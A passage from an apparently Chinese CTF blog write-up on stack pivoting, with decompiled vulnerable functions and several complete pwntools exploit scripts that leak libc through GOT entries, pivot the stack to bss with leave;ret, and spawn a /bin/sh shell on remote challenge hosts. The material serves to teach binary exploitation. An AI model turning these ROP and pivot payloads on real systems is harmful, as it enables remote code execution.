class="line">io.sendline(<span class="string">b&#x27;224&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Your message will be saved at &#x27;</span>)</span><br><span class="line">stack_addr = io.recv(<span class="number">14</span>)</span><br><span class="line">stack_addr =<span class="built_in">int</span>(stack_addr,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">pop_rdi_ret = <span class="number">0x400ad3</span></span><br><span class="line">pop_rsi__r15_ret =<span class="number">0x400ad1</span></span><br><span class="line">leave_ret = <span class="number">0x400A18</span></span><br><span class="line">offest = <span class="number">0xd0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">payload =payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">puts_addr=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr:&#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">system_addr = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;224&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Your message will be saved at &#x27;</span>)</span><br><span class="line">stack_addr = io.recv(<span class="number">14</span>)</span><br><span class="line">stack_addr =<span class="built_in">int</span>(stack_addr,<span class="number">16</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(leave_ret+<span class="number">1</span>)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)</span><br><span class="line">payload =payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%BE%8B2.1.png" alt="9"></p>
+<p>这个很明显要栈迁移了</p>
+<p>这个附件里面没有找到system的地址，所以我们只能通过泄露libc来打了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr) #ret2libc的payload</span><br><span class="line">payload =payload.ljust(0xd0,b&#x27;a&#x27;) #填充垃圾数据</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret) #stack_addr就是栈的起始位置，也就是我要迁移到的位置，本题直接回打印出来，接受就可以了</span><br><span class="line">b&#x27;a&#x27;*8是因为pop rbp的时候 rsp会+8，所以要。</span><br></pre></td></tr></table></figure>
+
+<p>发送payload后，就会泄露libc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*8+p64(leave_ret+1)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)</span><br><span class="line">#system(/bin/sh)  leave_ret+1---&gt;retn用于堆栈平衡 </span><br><span class="line">payload =payload.ljust(0xd0,b&#x27;a&#x27;)#填充垃圾数据</span><br><span class="line">payload+=p64(stack_addr)+p64(leave_ret) #同理最终栈迁移执行shell</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="栈迁移到这里基本就总结结束啦～🌈✨😊"><a href="#栈迁移到这里基本就总结结束啦～🌈✨😊" class="headerlink" title="栈迁移到这里基本就总结结束啦～🌈✨😊"></a>栈迁移到这里基本就总结结束啦～🌈✨😊</h2><p>这里记录一个难的栈迁移</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Are you the king of stack migrate?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x90u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good luck.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>0x90 - 0x80 &#x3D; 0x10典型的栈迁移,先给exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动远程连接</span></span><br><span class="line">io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="number">30481</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">leave_ret = <span class="number">0x4011c8</span></span><br><span class="line"><span class="comment"># 快捷函数</span></span><br><span class="line">sa = <span class="keyword">lambda</span> a, b: io.sendafter(a, b)</span><br><span class="line">ru = <span class="keyword">lambda</span> a: io.recvuntil(a)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">inter = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">padding = offset + <span class="number">0x8</span></span><br><span class="line">bss = <span class="number">0x404020</span> + <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次栈迁移：将rbp劫持到bss段</span></span><br><span class="line">pay_pivot = cyclic(offset) + p64(bss + offset) + p64(<span class="number">0x40119e</span>)  <span class="comment"># read -&gt; bss+off</span></span><br><span class="line">sa(<span class="string">b&#x27;Are you the king of stack migrate?\n&#x27;</span>, pay_pivot)</span><br><span class="line">ru(<span class="string">b&#x27;Good luck.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment"># 泄露puts地址</span></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="number">0x401146</span>, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>],     <span class="comment"># pop_rdi; puts_got; puts@plt</span></span><br><span class="line">    <span class="number">0x40112d</span>, bss + offset + <span class="number">0x200</span>, <span class="number">0x40119e</span>, <span class="comment"># pop_rbp; read -&gt; next stage</span></span><br><span class="line">    cyclic(<span class="number">0x50</span>),</span><br><span class="line">    bss - <span class="number">0x8</span>, leave_ret                      <span class="comment"># leave; ret</span></span><br><span class="line">)</span><br><span class="line">sd(payload)</span><br><span class="line">ru(<span class="string">b&#x27;Good luck.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析puts地址</span></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造最终payload执行system(&quot;/bin/sh&quot;)</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    pop_rdi := <span class="number">0x401146</span>,</span><br><span class="line">    binsh_addr,</span><br><span class="line">    system_addr</span><br><span class="line">).ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(bss + <span class="number">0x200</span> - <span class="number">0x8</span>) + p64(<span class="number">0x4011c8</span>)  <span class="comment"># leave_ret</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里只有一个read函数，所以我们迁到栈上几乎是不可能的了，所以我们就想到迁到bss的段上</span><br></pre></td></tr></table></figure>
+
+<p>这里把payload怎么构造和解题思路详细写一下。</p>
+<p>解题思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先将栈迁到bss的段上，返回地址覆盖为read函数，再次读入时泄露puts的地址，返回地址依然为read,再次读入getshell。</span><br></pre></td></tr></table></figure>
+
+<p>详细解释一下这个payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay_pivot = cyclic(offset) + p64(bss + offset) + p64(<span class="number">0x40119e</span>)</span><br></pre></td></tr></table></figure>
+
+<p>read_addr &#x3D; 0x40119e,rbp –&gt;p64(bss + offset),返回地址覆盖为read_addr(raed_addr后面有leave_ret)所以完成了，将栈迁移到bss + offset的位置进行读入。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">    <span class="number">0x401146</span>, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>],     <span class="comment"># pop_rdi; puts_got; puts@plt</span></span><br><span class="line">    <span class="number">0x40112d</span>, bss + offset + <span class="number">0x200</span>, <span class="number">0x40119e</span>, <span class="comment"># pop_rbp; read -&gt; next stage</span></span><br><span class="line">    cyclic(<span class="number">0x50</span>),</span><br><span class="line">    bss - <span class="number">0x8</span>, leave_ret                      <span class="comment"># leave; ret</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p> 0x401146, elf.got[‘puts’], elf.plt[‘puts’]写了puts的地址的payload。</p>
+<p> 0x40112d, bss + offset + 0x200, 0x40119e, # pop_rbp; read -&gt; next stage；利用pop_rbp再次利用read。</p>
+<p>cyclic(0x50)–&gt;0x401146, elf.got[‘puts’], elf.plt[‘puts’]和0x40112d, bss + offset + 0x200, 0x40119e加在一起是0x30+0x50&#x3D;0x80。</p>
+<p>bss - 0x8, leave_ret  ;将栈迁移到 bss - 0x8的位置。pop_rbp是怎么利用的呢，首先read读入这串payload后先执行 0x401146,     </p>
+<p>elf.got[‘puts’], elf.plt[‘puts’]泄露puts的地址，然后pop_rbp。rbp就储存了bss+offset + 0x200的位置，接着执行0x40119e，从bss + offset + </p>
+<p>0x200的位置开始read。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">    pop_rdi := <span class="number">0x401146</span>,</span><br><span class="line">    binsh_addr,</span><br><span class="line">    system_addr</span><br><span class="line">).ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(bss + <span class="number">0x200</span> - <span class="number">0x8</span>) + p64(<span class="number">0x4011c8</span>)</span><br></pre></td></tr></table></figure>
+
+<p>payload &#x3D; flat(<br>    pop_rdi :&#x3D; 0x401146,<br>    binsh_addr,<br>    system_addr<br>).ljust(0x80, b’\x00’)是构造system(&#x2F;bin&#x2F;sh) </p>
+<p>payload +&#x3D; p64(bss + 0x200 - 0x8) + p64(0x4011c8)完成栈迁移。</p>
+<h4 id="Black-Watch-入群题-PWN1"><a href="#Black-Watch-入群题-PWN1" class="headerlink" title="[Black Watch 入群题]PWN1"></a>[Black Watch 入群题]PWN1</h4><p>这题不难记录一下题目和exp就可以了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vul_function();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GoodBye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);   </span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200u</span>);  <span class="comment">//s在bss段上</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到远程服务</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27611</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境参数（架构、操作系统、日志等级）</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载本地 ELF 文件</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./spwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取程序中的符号地址</span></span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048513</span>  <span class="comment"># main 函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次发送 payload：泄露 write 的真实地址</span></span><br><span class="line">payload1 = <span class="string">b&#x27;aaaa&#x27;</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收输入提示</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造栈溢出 payload，覆盖返回地址，为下一次调用做准备</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p32(<span class="number">0x0804A300</span>) + p32(<span class="number">0x08048511</span>)  <span class="comment"># 0x0804A300 为 bss 段地址，0x08048511 为 level 函数返回地址</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收 write 的地址并解析</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&quot;Leaked write address: &quot;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 LibcSearcher 查找 libc 基址及 system 和 &quot;/bin/sh&quot; 地址</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - obj.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + obj.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次交互：发送调用 system(&quot;/bin/sh&quot;) 的 payload</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line">payload3 = <span class="string">b&#x27;aaaa&#x27;</span> + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次接收提示</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次构造栈溢出 payload，确保程序流正确执行</span></span><br><span class="line">payload4 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p32(<span class="number">0x0804A300</span>) + p32(<span class="number">0x08048511</span>)</span><br><span class="line">p.send(payload4)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式，获取 shell</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h4><p>这题不难也记录一下题目和exp就可以了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">96</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;锛積lcome to Stack bank,Tell me what you want&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x70u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!You can check and use your borrow stack now!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;bank, <span class="number">0x100u</span>LL);  <span class="comment">//bank在bss段</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到远程服务器</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25199</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境参数</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 libc 和 程序的 ELF 文件</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 plt 和 got 中 puts 的地址</span></span><br><span class="line">puts_plt_addr = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常量地址定义</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x400703</span>  <span class="comment"># pop rdi; ret 指令的地址</span></span><br><span class="line">level_ret_addr = <span class="number">0x400699</span>  <span class="comment"># level 函数返回地址</span></span><br><span class="line">bss_addr = <span class="number">0x601080</span>  <span class="comment"># bss 段地址</span></span><br><span class="line">ret_addr = <span class="number">0x4004c9</span>  <span class="comment"># ret 指令地址</span></span><br><span class="line">main_addr = <span class="number">0x400626</span>  <span class="comment"># main 函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个 payload：填充栈并跳转到 level_ret_addr</span></span><br><span class="line">payload1 = <span class="number">0x60</span> * <span class="string">b&#x27;a&#x27;</span> + p64(bss_addr) + p64(level_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二个 payload：执行 ret 多次，然后调用 puts 泄露地址，并回到 main 函数</span></span><br><span class="line">payload2 = p64(ret_addr) * <span class="number">20</span>  <span class="comment"># 使用至少 20 个 ret 指令</span></span><br><span class="line">payload2 += p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr)  <span class="comment"># 调用 puts 泄露 puts 地址</span></span><br><span class="line">payload2 += p64(main_addr)  <span class="comment"># 返回到 main 函数</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收泄露的 puts 地址</span></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Leaked puts address: <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 libc 基地址和 shell 地址</span></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">shell = libc_base + <span class="number">0x4526a</span>   system(<span class="string">&quot;/bin/sh&quot;</span>) 地址</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Shell address: <span class="subst">&#123;<span class="built_in">hex</span>(shell)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三个 payload：覆盖返回地址为 shell 地址</span></span><br><span class="line">payload3 = <span class="number">0x60</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0xdeadbeef</span>) + p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;u want\n&#x27;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收提示后发送 &#x27;1&#x27;</span></span><br><span class="line">p.recvuntil(<span 